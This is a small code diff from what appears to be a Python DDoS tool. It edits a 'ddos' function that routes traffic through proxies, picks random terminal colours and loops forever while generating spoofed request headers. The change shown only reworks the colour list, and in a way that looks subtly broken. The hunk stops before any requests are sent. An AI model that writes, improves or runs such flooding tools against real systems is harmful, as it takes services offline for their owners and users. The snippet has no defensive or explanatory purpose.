@@ -116,7 +116,7 @@ def check(ip, prox, url):
 
 def ddos(prox, url):
 	proxies={"http":"http://{}".format(prox), "https":"http://{}".format(prox)}
-	colors = ["\033[92m,\033[93m,\033[91m,\033[38;5;206m,\033[38;5;214m,\033[38;5;21m,\033[33m]
+	colors = (f"\033[92m,\033[93m,\033[91m,\033[38;5;206m,\033[38;5;214m,\033[38;5;21m,\033[33m")
 	color = random.choice(colors)
 	while True:
 		headers = Headers(headers=True).generate()
